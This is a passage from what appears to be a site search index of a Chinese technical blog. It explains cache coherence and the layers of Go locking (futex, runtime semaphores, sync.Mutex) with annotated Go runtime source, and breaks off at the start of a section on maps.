CPU2\u8981\u72ec\u5360\u67d0\u4e00\u6bb5\u5730\u5740\u3002CPU1\u3001CPU3\u3001CPU4\u4e00\u76f4\u90fd\u5728\u55c5\u63a2\u603b\u7ebf\u53bb\u63a5\u6536\u603b\u7ebf\u7684\u901a\u77e5\uff0c\u7136\u540e\u53bb\u68c0\u67e5\u81ea\u5df1\u7684\u7f13\u5b58\u4e2d\u6709\u6ca1\u6709\u8fd9\u884c\u6570\u636e\uff0c\u5982\u679cCPU3\u6709\u4e14\u8fd9\u884c\u72b6\u6001\u662f\u5171\u4eab\u7684\uff0c\u90a3\u5c31\u628aCPU3\u7684\u8fd9\u884c\u53d8\u4e3a\u5931\u6548\u72b6\u6001\uff1b\u4f46\u5982\u679cCPU1\u90a3\u884c\u5df2\u7ecf\u662f\u72ec\u5360\u7684\uff0c\u8fd9\u4e2aCPU2\u5c31\u5f97\u7b49\uff0c\u7b49\u5230CPU1\u4fee\u6539\u5b8c\u6570\u636e\u56de\u5199\u5230\u4e3b\u5b58\u5f53\u4e2d\u4f1a\u89e3\u9664CPU1\u7684\u72ec\u5360\u72b6\u6001\uff0cCPU2\u91cd\u65b0\u4ece\u4e3b\u5b58\u5237\u65b0\u81ea\u5df1\u7684\u7f13\u5b58\u518d\u628a\u5b83\u4fee\u6539\u4e3a\u72ec\u5360\u72b6\u6001\u3002\u4fee\u6539\u4e86\u6570\u636e\u5c31\u9700\u8981\u6539\u4e3amodify\uff0c\u56e0\u4e3a\u9700\u8981\u4e00\u6279\u6570\u636e\u4e00\u540c\u5237\u5165\u4e3b\u5b58\u3002</p> <p>\u8fd9\u79cd\u901a\u8fc7\u56db\u79cd\u72b6\u6001\u4fdd\u8bc1\u7f13\u5b58\u4e00\u81f4\u6027\u7684\u65b9\u5f0f\u548c\u6211\u4eec\u65e5\u5e38\u89c1\u5230\u7684\u9501\u7684\u539f\u7406\u5dee\u4e0d\u591a\uff0c\u6570\u636e\u5e93\u4fee\u6539\u67d0\u884c\u7684\u65f6\u5019\u4e5f\u662f\u52a0\u884c\u9501\uff0c\u5176\u4ed6\u4eba\u8981\u4fee\u6539\u8be5\u884c\u5c31\u5f97\u6392\u961f\uff0c\u8981\u4fee\u6539\u5176\u4ed6\u884c\u5c31\u4e0d\u53d7\u5f71\u54cd\u3002 </p>"},{"location":"go/lock/#go","title":"Go\u8bed\u8a00\u4e2d\u7684\u9501","text":""},{"location":"go/lock/#futex","title":"Futex","text":"<p>\u9501\u7684\u672c\u8d28\u662f\u901a\u8fc7\u67d0\u79cd\u64cd\u4f5c\u5b9e\u73b0\u4f11\u7720\u3001\u5524\u9192\u7b49\u64cd\u4f5c\uff0c\u90a3\u5b83\u5c31\u4e00\u5b9a\u8981\u7531\u64cd\u4f5c\u7cfb\u7edf\u6765\u5b9e\u73b0\uff0c\u7531OS\u5b9e\u73b0\u624d\u80fd\u907f\u514d\u5bf9\u4e8e\u4f11\u7720\u7684\u5355\u4f4d\u4e0d\u53bb\u5206\u914d\u65f6\u95f4\u7247\u3002\u90a3\u4e48\u9501\u5c31\u9700\u8981\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u7684\u6548\u7387\u5c31\u4f1a\u975e\u5e38\u4f4e\uff1fLinux\u5728\u5f88\u65e9\u671f\u7684\u7248\u672c\u5c31\u63d0\u4f9b\u4e86\u4e00\u79cd\u9501Futex\uff0c\u867d\u7136\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\uff0c\u4f46\u5b83\u662f\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u7684\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u8fdb\u5165\u5185\u6838\u7a7a\u95f4\uff0c\u907f\u514d\u4e86\u901a\u5e38\u7684\u7cfb\u7edf\u8c03\u7528\u6240\u9700\u7684\u7528\u6237\u6001\u5185\u6838\u6001\u4e4b\u95f4\u7684\u5207\u6362\u3002Futex\u5176\u5b9e\u5c31\u662f\u4e00\u5757\u5185\u5b58\u7a7a\u95f4\uff0c\u901a\u5e38\u662f\u4e00\u4e2a\u6574\u578b\u53d8\u91cf\uff0c\u5927\u5bb6\u901a\u8fc7\u539f\u5b50\u64cd\u4f5c\u5bf9\u5b83\u505a\u4fee\u6539\uff0c\u8981\u4e48\u5c31\u4fee\u6539\u6210\u529f\u6267\u884c\u903b\u8f91\uff0c\u8981\u4e48\u5c31\u4fee\u6539\u5931\u8d25\u7b49\u5f85\u5b83\u3002</p> <p>Linux\u624b\u518c\u4e2d\u63d0\u4f9b\u4e86\u8fd9\u79cd\u9501\u7684\u8c03\u7528\u65b9\u5f0f\uff0c\u5305\u62ec\u9501\u5b9a\u3001\u7b49\u5f85\u3001\u5524\u9192\u7b49\u53c2\u6570\u3002Go\u4e2d\u8c03\u7528\u5176API:</p> src/runtime/os_linux.go<pre><code>func futex(addr unsafe.Pointer, op int32, val uint32, ts, addr2 unsafe.Pointer, val3 uint32) int32\n\n// Linux futex.\n//\n//  futexsleep(uint32 *addr, uint32 val)\n//  futexwakeup(uint32 *addr)\n//\n// Futexsleep atomically checks if *addr == val and if so, sleeps on addr.\n// Futexwakeup wakes up threads sleeping on addr.\n// Futexsleep is allowed to wake up spuriously.\n\n\nfunc futexsleep(addr *uint32, val uint32, ns int64) {\n    if ns &lt; 0 {\n        futex(unsafe.Pointer(addr), _FUTEX_WAIT_PRIVATE, val, nil, nil, 0)\n        return\n    }\n\n    var ts timespec\n    ts.setNsec(ns)\n    futex(unsafe.Pointer(addr), _FUTEX_WAIT_PRIVATE, val, unsafe.Pointer(&amp;ts), nil, 0)\n}\n\nfunc futexwakeup(addr *uint32, cnt uint32) {\n    ret := futex(unsafe.Pointer(addr), _FUTEX_WAKE_PRIVATE, cnt, nil, nil, 0)\n    if ret &gt;= 0 {\n        return\n    }\n\n    systemstack(func() {\n        print(\"futexwakeup addr=\", addr, \" returned \", ret, \"\\n\")\n    })\n\n    *(*int32)(unsafe.Pointer(uintptr(0x1006))) = 0x1006\n}\n</code></pre> <p>\u6709\u4e86API\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u7528\uff0c\u8fd8\u8981\u5bf9\u5176\u8fdb\u884c\u5305\u88c5:</p> src/runtime/lock_futex.go<pre><code>func lock(l *mutex) {\n    gp := getg()\n\n    if gp.m.locks &lt; 0 {\n        throw(\"runtime\u00b7lock: lock count\")\n    }\n    gp.m.locks++\n\n    // \u5c1d\u8bd5\u539f\u5b50\u64cd\u4f5c\u4fee\u6539l.key\u7684\u503c\u4e3a\u9501\u5b9a\u72b6\u6001\n    v := atomic.Xchg(key32(&amp;l.key), mutex_locked)\n    if v == mutex_unlocked {\n        return\n    }\n    // \u5c1d\u8bd5\u5931\u8d25\u5219\u8fdb\u5165\u81ea\u65cb\u72b6\u6001\n    wait := v\n    spin := 0\n    if ncpu &gt; 1 {\n        spin = active_spin\n    }\n    for {\n        // \u6bcf\u81ea\u65cb\u4e00\u6b21\u5c1d\u8bd5\u62ff\u4e00\u6b21\u9501\n        for i := 0; i &lt; spin; i++ {\n            for l.key == mutex_unlocked {\n                if atomic.Cas(key32(&amp;l.key), mutex_unlocked, wait) {\n                    return\n                }\n            }\n            procyield(active_spin_cnt)\n        }\n\n        // \u5728rescheduling\u72b6\u6001\u8fdb\u884c\u5c1d\u8bd5\u62ff\u9501\n        for i := 0; i &lt; passive_spin; i++ {\n            for l.key == mutex_unlocked {\n                if atomic.Cas(key32(&amp;l.key), mutex_unlocked, wait) {\n                    return\n                }\n            }\n            osyield()\n        }\n\n        // \u5c1d\u8bd5\u8fdb\u5165\u7761\u7720\u72b6\u6001\n        v = atomic.Xchg(key32(&amp;l.key), mutex_sleeping)\n        if v == mutex_unlocked {\n            return\n        }\n        // \u8fdb\u5165futex\u7761\u7720\u72b6\u6001\n        wait = mutex_sleeping\n        futexsleep(key32(&amp;l.key), mutex_sleeping, -1)\n    }\n}\n\nfunc unlock(l *mutex) {\n    v := atomic.Xchg(key32(&amp;l.key), mutex_unlocked)\n    if v == mutex_unlocked {\n        throw(\"unlock of unlocked lock\")\n    }\n    // futex\u5524\u9192\u64cd\u4f5c\n    if v == mutex_sleeping {\n        futexwakeup(key32(&amp;l.key), 1)\n    }\n\n    gp := getg()\n    gp.m.locks--\n    if gp.m.locks &lt; 0 {\n        throw(\"runtime\u00b7unlock: lock count\")\n    }\n    if gp.m.locks == 0 &amp;&amp; gp.preempt {\n        gp.stackguard0 = stackPreempt\n    }\n}\n</code></pre> <p>\u5176\u4e00\u5f00\u59cb\u5c1d\u8bd5\u62ff\u9501\u5c5e\u4e8e\u6295\u673a\uff0c\u5148\u4ee5\u6700\u4e50\u89c2\u7684\u60c5\u51b5\u8003\u8651\uff0c\u5982\u679c\u6ca1\u4eba\u7ade\u4e89\u5c31\u80fd\u76f4\u63a5\u62ff\u5230\u9501\uff0c\u8fd9\u79cd\u6982\u7387\u5e76\u4e0d\u4f4e\uff0c\u6211\u4eec\u81ea\u5df1\u505a\u6027\u80fd\u8bbe\u8ba1\u65f6\u4e5f\u53ef\u4ee5\u53c2\u8003\u5b83\u5148\u8bbe\u8ba1\u4e50\u89c2\u7684\u60c5\u51b5\u3002\u5c1d\u8bd5\u5931\u8d25\u5219\u8fdb\u5165\u81ea\u65cb\u72b6\u6001\uff0c\u81ea\u65cb\u72b6\u6001\u6253\u4e2a\u6bd4\u65b9\uff0c\u5c31\u662f\u4f60\u5728\u706b\u8f66\u4e0a\u4e0a\u5395\u6240\uff0c\u53d1\u73b0\u5395\u6240\u6709\u4eba\uff0c\u4f60\u5728\u5916\u9762\u7126\u6025\u7684\u8f6c\u5708\u7b49\u5f85\uff1b\u5b83\u662f\u6b21\u4e00\u7ea7\u7684\u7406\u60f3\u72b6\u6001\uff0c\u56e0\u4e3a\u5395\u6240\u7684\u4eba\u51fa\u6765\u4f60\u9a6c\u4e0a\u5c31\u80fd\u8fdb\u53bb\uff0c\u82e5\u662f\u56de\u5230\u5ea7\u4f4d\u4e0a\u53ef\u80fd\u88ab\u4eba\u63d2\u961f\uff1b<code>procyield(active_spin_cnt)</code>\u80cc\u540e\u4f1a\u8c03\u7528\u4e00\u4e2a\u4e13\u95e8\u7684CPU\u6307\u4ee4PAUSE\uff0c\u5b83\u53ef\u4ee5\u964d\u4f4e\u81ea\u65cb\u72b6\u6001\u65f6CPU\u7684\u529f\u8017\u5e76\u8fdb\u5165\u4e00\u4e2a\u77ed\u6682\u7684\u7b49\u5f85\u3002\u81ea\u65cb\u65f6\u6ca1\u62ff\u5230\u9501\u5219\u8fdb\u5165\u53e6\u4e00\u4e2a\u72b6\u6001\uff0c\u76f8\u5f53\u4e8e\u56de\u5230\u5ea7\u4f4d\u4e0a\u4f46\u662f\u76ef\u7740\u5395\u6240\u7684\u95e8\uff0c\u8fd9\u4e2a\u72b6\u6001\u4e0b\u6267\u884c\u7684<code>osyield()</code>\u662f\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u7b49\u5f85\uff0c\u8fd9\u79cd\u7b49\u5f85\u7684\u65f6\u957f\u5c31\u6bd4CPU\u6307\u4ee4\u957f\u5f88\u591a\uff0c\u540c\u65f6\u6d89\u53ca\u5230\u72b6\u6001\u5207\u6362\u5f00\u9500\u4e5f\u4f1a\u5927\u5f88\u591a\u3002\u8fd9\u79cd\u79ef\u6781\u7684\u5c1d\u8bd5\u5982\u679c\u4ecd\u7136\u5931\u8d25\uff0c\u5219\u8fdb\u5165\u7761\u7720\u72b6\u6001\uff0c\u7b49\u5f85\u5395\u6240\u91cc\u9762\u7684\u4eba\u51fa\u6765\u5524\u9192\u5b83\uff0c\u5524\u9192\u540e\u91cd\u65b0\u8fdb\u5165\u8fd9\u4e2a\u5faa\u73af\u3002</p> <p>\u5c3d\u7ba1\u505a\u4e86\u8fd9\u6837\u7684\u5305\u88c5\uff0c\u8fd9\u79cd\u9501\u4ecd\u7136\u5c5e\u4e8e\u8f83\u4f4e\u5c42\u6b21\u7684\uff0c\u4e00\u822c\u4e0d\u4f1a\u7ed9\u7528\u6237\u76f4\u63a5\u7528\u3002</p>"},{"location":"go/lock/#sema","title":"Sema","text":"<p>\u4fe1\u53f7\u91cf\uff0c\u53ef\u4ee5\u63a7\u5236\u540c\u65f6\u6267\u884c\u7684\u6570\u91cf\uff0c\u5982\u679c\u6570\u91cf\u662f1\u5c31\u76f8\u5f53\u4e8e\u4e92\u65a5\u9501\uff0c\u5982\u679c\u90fd\u5728\u6267\u884c\u4e86\u518d\u8fdb\u6765\u4eba\u5c31\u5f97\u6392\u961f\u3002</p> <p>\u9996\u5148\uff0c\u5b83\u7684\u7ed3\u6784\u662f\u8fd9\u6837\u7684: src/runtime/sema.go<pre><code>type semaRoot struct {\n    lock  mutex\n    treap *sudog // root of balanced tree of unique waiters.\n    nwait uint32 // Number of waiters. Read w/o the lock.\n}\n</code></pre></p> <p><code>lock</code> \u5c31\u662f\u4e4b\u524d\u8bbe\u8ba1\u7684\u90a3\u79cd\u9501\uff0c\u5728\u8fd9\u4e4b\u4e0a\u63d0\u4f9b\u4e86\u4e00\u4e2a<code>treap</code>\u8fd9\u6837\u7684\u5e73\u8861\u6811\u7ed3\u6784\uff0c\u5b83\u662f\u7b49\u5f85\u4eba(G\u5bf9\u8c61)\u7684\u5217\u8868\uff0c\u8fd8\u6709<code>nwait</code>\u8ba1\u6570\u5668\u5b58\u50a8\u7b49\u5f85\u4eba\u7684\u6570\u91cf\u3002</p> <p>\u5b83\u7684\u6838\u5fc3\u83b7\u53d6\u9501\u7684\u903b\u8f91: <pre><code>func semacquire1(addr *uint32, lifo bool, profile semaProfileFlags, skipframes int) {\n    //\u7b80\u5355\u7684\u60c5\u51b5\uff0c\u5373\u76f4\u63a5\u6210\u529f\u83b7\u53d6\u9501\n    if cansemacquire(addr) {\n        return\n    }\n    ...\n    // \u590d\u6742\u7684\u60c5\u51b5:\n    //  1.\u589e\u52a0\u7b49\u5f85\u8005\u8ba1\u6570\uff1b\n    //  2.\u518d\u5c1d\u8bd5\u4e00\u6b21\u83b7\u53d6\u9501\uff0c\u6210\u529f\u5219\u8fd4\u56de\uff1b\n    //  3.\u5c06\u81ea\u5df1enqueue waiter\uff1b\n    //  4.\u7761\u7720\n    for {\n        lock(&amp;root.lock)\n        atomic.Xadd(&amp;root.nwait, 1)\n        if cansemacquire(addr) {\n            atomic.Xadd(&amp;root.nwait, -1)\n            unlock(&amp;root.lock)\n            break\n        }\n        root.queue(addr, s, lifo)\n        goparkunlock(&amp;root.lock, waitReasonSemacquire, traceEvGoBlockSync, 4+skipframes)\n        if s.ticket != 0 || cansemacquire(addr) {\n            break\n        }\n    }\n    if s.releasetime &gt; 0 {\n        blockevent(s.releasetime-t0, 3+skipframes)\n    }\n    releaseSudog(s)\n}\n\nfunc cansemacquire(addr *uint32) bool {\n    for {\n        v := atomic.Load(addr)\n        if v == 0 {\n            return false\n        }\n        if atomic.Cas(addr, v, v-1) {\n            return true\n        }\n    }\n}\n</code></pre> \u9996\u5148\u5c1d\u8bd5\u53bb\u9501\u5b9a\uff0c\u5e76\u7ed9\u7b49\u5f85\u8005\u7684\u6570\u91cf\u52a0\u4e0a1\uff0c\u7136\u540e\u901a\u8fc7<code>cansemacquire</code>\u68c0\u67e5\u4e00\u4e0b\u80fd\u4e0d\u80fd\u83b7\u5f97\u8fd9\u628a\u9501\uff0c\u80fd\u83b7\u5f97\u5219\u51cf1\u9000\u51fa\u5faa\u73af\u3002\u4e0d\u80fd\u83b7\u5f97\u5219\u52a0\u5165\u5230\u961f\u5217\u4e2d\uff0c<code>goparkunlock</code>\u4f11\u7720\u3002\u4fe1\u53f7\u91cf\u5f52\u6839\u7ed3\u5e95\u662f\u7528\u539f\u5b50\u64cd\u4f5c\u6765\u7ef4\u62a4\u67d0\u4e2a\u5730\u5740\u4e0a\u7684\u4fe1\u53f7\u91cf\u52a0\u51cf\uff0c\u7528\u4e00\u4e2a\u9501\u6765\u7ef4\u62a4\u4e00\u4e2a\u7b49\u5f85\u8005\u8ba1\u6570\u5668\uff0c\u8fd9\u91cc\u7684<code>&amp;root.lock</code>\u662f\u4e3a\u4e86\u4fdd\u62a4\u5bf9\u8ba1\u6570\u5668\u7684\u64cd\u4f5c\u548c\u5165\u961f\u7684\u64cd\u4f5c\u3002</p> <p>\u63a5\u7740\u6211\u4eec\u770b\u770b\u91ca\u653e: <pre><code>func semrelease1(addr *uint32, handoff bool, skipframes int) {\n    root := semroot(addr)\n    atomic.Xadd(addr, 1)\n\n    // \u7b80\u5355\u7684\u60c5\u51b5\uff1a\u6ca1\u6709\u7b49\u5f85\u8005\n    if atomic.Load(&amp;root.nwait) == 0 {\n        return\n    }\n\n    // \u590d\u6742\u7684\u60c5\u51b5\uff1a\u627e\u5230\u4e00\u4e2a\u7b49\u5f85\u8005\u5e76\u5524\u9192\u5b83\n    lock(&amp;root.lock)\n    if atomic.Load(&amp;root.nwait) == 0 {\n        unlock(&amp;root.lock)\n        return\n    }\n    s, t0 := root.dequeue(addr)\n    if s != nil {\n        atomic.Xadd(&amp;root.nwait, -1)\n    }\n    unlock(&amp;root.lock)\n    if s != nil { // May be slow or even yield, so unlock first\n        acquiretime := s.acquiretime\n        if acquiretime != 0 {\n            mutexevent(t0-acquiretime, 3+skipframes)\n        }\n        if s.ticket != 0 {\n            throw(\"corrupted semaphore ticket\")\n        }\n        if handoff &amp;&amp; cansemacquire(addr) {\n            s.ticket = 1\n        }\n        readyWithTime(s, 5+skipframes)\n        if s.ticket == 1 &amp;&amp; getg().m.locks == 0 {\n            goyield()\n        }\n    }\n}\n</code></pre></p> <p>\u9996\u5148\uff0c\u91ca\u653e\u5fc5\u7136\u4f7f\u5730\u5740\u4e0a\u7684\u4fe1\u53f7\u91cf\u52a01\u3002\u5176\u6b21\uff0c\u53bb\u67e5\u770b\u662f\u5426\u6709\u4eba\u7b49\uff0c\u6ca1\u4eba\u7b49\u5219\u76f4\u63a5\u9000\u51fa\uff1b\u5982\u679c\u6709\u4eba\u7b49\uff0c\u5219\u4ece\u961f\u5217\u4e2ddequeue\u4e00\u4e2a\u7b49\u5f85\u8005\u3001\u8ba1\u6570\u5668\u51cf\u4e00\uff0c\u7b49\u5f85\u8005\u53ef\u80fd\u662f\u6309\u5730\u5740\u6392\u5e8f\u7684\uff0c\u4f46\u8fd9\u5c5e\u4e8e\u5176\u5185\u90e8\u5b9e\u73b0\uff0c\u6211\u4eec\u6ca1\u6cd5\u786e\u5b9a\u5f39\u51fa\u7684\u662f\u8c01\u3002\u6700\u540e\u5982\u679c\u4f20\u5165\u7684<code>handoff</code>\u4e3atrue\u8868\u793a\u8981\u8fdb\u884c\u6743\u9650\u8f6c\u79fb\uff0c\u4f1a\u7ed9\u8fd9\u4e2a\u5f39\u51fa\u7684\u7b49\u5f85\u8005\u53d1\u4e00\u5f20\u7968\uff0c\u4e4b\u524d<code>semacquire1</code>\u7684for\u5faa\u73af\u4e2d<code>goparkunlock</code>\u4f11\u7720\u540e\u88ab\u5524\u9192\u7684\u7b2c\u4e00\u4ef6\u4e8b\u5c31\u662f\u68c0\u67e5\u6709\u6ca1\u6709\u62ff\u5230\u7968\uff0c\u62ff\u5230\u4e86\u5219\u53ef\u4ee5\u77ed\u8def\u51fa\u53bb\uff0c\u6ca1\u5fc5\u8981\u518d\u8d70\u4e00\u6b21for\u5faa\u73af\u548c\u522b\u4eba\u7ade\u4e89\u62a2\u9501<code>&amp;root.lock</code>\u3002</p> <p>\u4fe1\u53f7\u91cf\u7ed3\u5408\u4e86\u5b83\u7684\u7279\u5f81\uff0c\u5728\u4e00\u4e9b\u77ed\u8def\u7684\u8bbe\u8ba1\u4e0a\u503c\u5f97\u6211\u4eec\u5b66\u4e60\u3002\u5b83\u4ecd\u7136\u662fruntime\u5c42\u9762\u7684\uff0c\u8fd8\u4e0d\u662f\u4ea4\u7ed9\u7528\u6237\u53bb\u4f7f\u7528\u7684\u3002</p>"},{"location":"go/lock/#mutex","title":"Mutex","text":"<p>\u7ed9\u7528\u6237\u4f7f\u7528\u7684\u9501\u5728\u6807\u51c6\u5e93\u4e2d\uff0c\u6211\u4eec\u6765\u770b\u770b\u5b83\u7684\u5b9e\u73b0: src/sync/mutex.go<pre><code>type Mutex struct {\n    state int32\n    sema  uint32\n}\nconst (\n    mutexLocked = 1 &lt;&lt; iota // mutex is locked\n    mutexWoken\n    mutexStarving\n    mutexWaiterShift = iota\n)\n</code></pre></p> <p>Mutex\u7ed3\u6784\u5305\u62ec\u4e00\u4e2a\u72b6\u6001\u548c\u4e00\u4e2a\u8ba1\u6570\uff0c\u8fd9\u4e2a\u72b6\u6001\u5206\u4e3a\u56db\u79cd\uff0c\u5373\u9501\u5b9a\u3001\u5524\u9192(\u8fd9\u91cc\u53ef\u4ee5\u7406\u89e3\u4e3a\u81ea\u65cb)\u3001\u9965\u997f\u3001\u7b49\u5f85\u8005\u8f6c\u79fb\u3002\u600e\u6837\u4f1a\u51fa\u73b0\u9965\u997f\u72b6\u6001\u5462\uff1f\u6bd4\u5982A\u3001B\u7ade\u4e89\u4e00\u628a\u9501\u7684\u65f6\u5019\uff0cA\u62ff\u5230\u4e86\uff0cB\u7ecf\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u6700\u7ec8\u8fdb\u5165\u4e86\u7761\u7720\u72b6\u6001\uff0cA\u91ca\u653e\u9501\u7684\u65f6\u5019\u53c8\u6709C\u53bb\u7ade\u4e89\u9501\uff0cC\u6b64\u65f6\u53ef\u80fd\u5904\u4e8e\u81ea\u65cb\u72b6\u6001\uff0c\u540c\u7406C\u540e\u9762\u53ef\u80fd\u8fd8\u6709D\u3001E\uff0cB\u5c31\u4e00\u76f4\u62ff\u4e0d\u5230\u9501\u5904\u4e8e\u9965\u997f\u72b6\u6001\u3002\u8fd9\u79cd\u72b6\u6001\u5728\u5e76\u53d1\u7f16\u7a0b\u4e2d\u5e76\u4e0d\u5c11\u89c1\u3002</p> <p>\u63a5\u7740\u6211\u4eec\u770b\u770b\u5176\u9501\u5b9a\u7684\u8fc7\u7a0b: <pre><code>func (m *Mutex) Lock() {\n    // \u8fdb\u5165\u5feb\u901f\u8def\u5f84\uff0c\u4e50\u89c2\u72b6\u6001\uff0c\u6ca1\u6709\u7ade\u4e89\n    if atomic.CompareAndSwapInt32(&amp;m.state, 0, mutexLocked) {\n        if race.Enabled {\n            race.Acquire(unsafe.Pointer(m))\n        }\n        return\n    }\n    // \u8fdb\u5165\u6162\u901f\u65b9\u5f0f\n    m.lockSlow()\n}\n\nfunc (m *Mutex) lockSlow() {\n    var waitStartTime int64\n    starving := false\n    awoke := false\n    iter := 0\n    old := m.state\n    for { // \u4f9d\u7136\u901a\u8fc7\u5faa\u73af\u5904\u7406\n        // \u5224\u65ad\u6ca1\u6709\u4eba\u5904\u4e8e\u9965\u997f\u72b6\u6001\uff0c\u4e14\u8fd8\u6709\u53ef\u81ea\u65cb\u6b21\u6570\uff0c\u5219\u8fdb\u5165\u81ea\u65cb\u72b6\u6001\u53bb\u5c1d\u8bd5\u62ff\u8fd9\u628a\u9501\n        if old&amp;(mutexLocked|mutexStarving) == mutexLocked &amp;&amp; runtime_canSpin(iter) {\n            if !awoke &amp;&amp; old&amp;mutexWoken == 0 &amp;&amp; old&gt;&gt;mutexWaiterShift != 0 &amp;&amp;\n                atomic.CompareAndSwapInt32(&amp;m.state, old, old|mutexWoken) {\n                awoke = true\n            }\n            runtime_doSpin()\n            iter++\n            old = m.state\n            // \u62ff\u5230\u9501\u5219\u662fmutexLocked\u72b6\u6001\uff0c\u63a5\u7740\u5411\u4e0b\u8d70\uff1b\u6ca1\u62ff\u5230\u91cd\u65b0\u770b\u53ef\u81ea\u65cb\u6b21\u6570\u3002\n            continue\n        }\n        // \u4ece\u8fd9\u5f00\u59cb\u5c31\u6709\u4e24\u79cd\u53ef\u80fd\uff0c\u8981\u4e48\u62ff\u5230\u9501\u4e86\uff0c\u8981\u4e48\u81ea\u65cb\u6b21\u6570\u7528\u5b8c\u4e86\n        new := old\n        // \u63a5\u7740\u4e3b\u8981\u505a\u4e00\u4e9b\u72b6\u6001\u53d8\u66f4\u548c\u5904\u7406\n        if old&amp;mutexStarving == 0 {\n            new |= mutexLocked\n        }\n        if old&amp;(mutexLocked|mutexStarving) != 0 {\n            new += 1 &lt;&lt; mutexWaiterShift\n        }\n        if starving &amp;&amp; old&amp;mutexLocked != 0 {\n            new |= mutexStarving\n        }\n        if awoke {\n            if new&amp;mutexWoken == 0 {\n                throw(\"sync: inconsistent mutex state\")\n            }\n            new &amp;^= mutexWoken\n        }\n        if atomic.CompareAndSwapInt32(&amp;m.state, old, new) {\n            // \u6ca1\u4eba\u4e0a\u9501\u4e14\u6ca1\u6709\u9965\u997f\u72b6\u6001\u7684\uff0c\u5219\u53ef\u4ee5\u62ff\u5230\u9501\u8df3\u51fa\u6574\u4e2a\u5faa\u73af\n            if old&amp;(mutexLocked|mutexStarving) == 0 {\n                break // locked the mutex with CAS\n            }\n            // \u5982\u679c\u6211\u4e4b\u524d\u5df2\u7ecf\u5728\u7b49\u5f85\u4e86\uff0c\u5219\u6392\u5728\u961f\u5217\u7684\u6700\u524d\u9762\n            queueLifo := waitStartTime != 0\n            if waitStartTime == 0 {\n                waitStartTime = runtime_nanotime()\n            }\n            runtime_SemacquireMutex(&amp;m.sema, queueLifo, 1)\n            // \u5224\u65ad\u65f6\u95f4\u662f\u4e0d\u662f\u8d85\u51fa\u4e86\u9965\u997f\u72b6\u6001\u7684\u65f6\u95f4\u9608\u503c\n            starving = starving || runtime_nanotime()-waitStartTime &gt; starvationThresholdNs\n            old = m.state\n            // \u5982\u679c\u6211\u81ea\u5df1\u5c31\u662f\u9965\u997f\u7684\uff0c\u90a3\u4e48\u6211\u62ff\u5230\u9501\uff0c\u505a\u76f8\u5173\u72b6\u6001\u4fee\u6539\uff0c\u9000\u51fa\u5faa\u73af\n            if old&amp;mutexStarving != 0 {\n                if old&amp;(mutexLocked|mutexWoken) != 0 || old&gt;&gt;mutexWaiterShift == 0 {\n                    throw(\"sync: inconsistent mutex state\")\n                }\n                delta := int32(mutexLocked - 1&lt;&lt;mutexWaiterShift)\n                if !starving || old&gt;&gt;mutexWaiterShift == 1 {\n                    delta -= mutexStarving\n                }\n                atomic.AddInt32(&amp;m.state, delta)\n                break\n            }\n            awoke = true\n            iter = 0\n        } else {\n            old = m.state\n        }\n    }\n\n    if race.Enabled {\n        race.Acquire(unsafe.Pointer(m))\n    }\n}\n</code></pre></p>"},{"location":"go/lock/#_5","title":"\u603b\u7ed3","text":"<p>\u6211\u4eec\u4ece\u539f\u5b50\u64cd\u4f5c\u5230Mutex\uff0c\u7ecf\u5386\u4e86\u56db\u4e2a\u5c42\u6b21\u7684\u5305\u88c5\uff0c\u6bcf\u5c42\u5305\u88c5\u9762\u5411\u4e0d\u540c\u7684\u76ee\u7684\u53bb\u89e3\u51b3\u4e0d\u540c\u7684\u95ee\u9898\u3002\u5728\u505a\u53d1\u52a8\u673a\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8003\u8651\u7684\u662f\u52a8\u529b\u3001\u6027\u80fd\u3001\u7701\u6cb9\uff0c\u4f46\u62ff\u5b83\u505a\u98de\u673a\u5f15\u64ce\u8fd8\u662f\u505a\u6c7d\u8f66\u5f15\u64ce\u5c31\u8981\u505a\u4e0d\u540c\u7684\u5305\u88c5\u3002\u6211\u4eec\u5e73\u65f6\u505a\u8bbe\u8ba1\u7684\u65f6\u5019\u5f80\u5f80\u4e5f\u9700\u8981\u5c42\u8fdb\u5f0f\u7684\u8003\u8651\u95ee\u9898\uff0c\u4e0d\u8981\u603b\u662f\u60f3\u7740\u4e00\u6b65\u5230\u4f4d\u3002</p>"},{"location":"go/map/","title":"\u5b57\u5178","text":"<p>\u73b0\u4ee3\u7f16\u7a0b\u8bed\u8a00\uff0c\u4f8b\u5982Python\u548cGo\u4e2d\u90fd\u6709\u5b57\u5178\uff0c\u5176\u4f5c\u4e3a\u4e00\u79cd\u5e38\u89c1\u6570\u636e\u7ed3\u6784\u4f7f\u7528\u9891\u7387\u975e\u5e38\u9ad8\u3002\u4e00\u822c\u4f5c\u4e3a\u5185\u7f6e\u7c7b\u578b\uff0c\u89e3\u91ca\u5668\u6216\u8005\u7f16\u8bd1\u5668\u90fd\u4f1a\u5bf9\u5176\u7279\u522b\u7684\u7167\u987e\uff0c\u505a\u76f8\u5f53\u591a\u7684\u4f18\u5316\uff0c\u5b83\u7684\u8bbe\u8ba1\u4e5f\u9700\u8981\u5728\u901a\u7528\u548c\u6027\u80fd\u4e0a\u627e\u5230\u5e73\u8861\uff0c\u5f53\u7136\u4e5f\u662f\u6211\u4eec\u975e\u5e38\u597d\u7684\u5b66\u4e60\u6848\u4f8b\u3002</p> <p>\u8981\u5b58\u50a8\u4e00\u6279\u6570\u636e\uff0c\u6211\u4eec\u6700\u5148\u60f3\u5230\u7684\u5c31\u662f\u7528\u6570\u7ec4\uff0c\u56e0\u4e3a\u5b83\u5bf9\u6240\u6709\u7684\u5b58\u50a8\u5668\u4eb2\u548c\u6027\u662f\u6700\u597d\u7684\uff0c\u5185\u5b58\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2a\u5927\u7684\u5b57\u8282\u6570\u7ec4\uff0cCPU cache 